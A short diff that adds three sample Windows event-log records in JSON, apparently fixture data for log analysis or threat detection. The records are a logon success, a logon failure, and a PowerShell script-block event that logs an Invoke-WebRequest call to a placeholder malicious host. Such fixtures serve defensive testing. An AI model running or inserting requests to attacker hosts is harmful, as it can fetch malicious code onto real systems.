@@ -1,0 +1,3 @@
+{"EventID": 4624, "TimeCreated": "2026-10-11T10:45:01Z", "Computer": "WIN-SERVER-01", "Message": "An account was successfully logged on.", "EventData": {"TargetUserName": "admin", "IpAddress": "192.168.1.150"}}
+{"EventID": 4625, "TimeCreated": "2026-10-11T10:50:01Z", "Computer": "WIN-SERVER-01", "Message": "An account failed to log on.", "EventData": {"TargetUserName": "guest", "IpAddress": "10.0.0.99"}}
+{"EventID": 4104, "TimeCreated": "2026-10-11T11:00:00Z", "Computer": "WIN-SERVER-01", "Message": "Powershell script block logged: Invoke-WebRequest -Uri http://malicious.com", "EventData": {}}
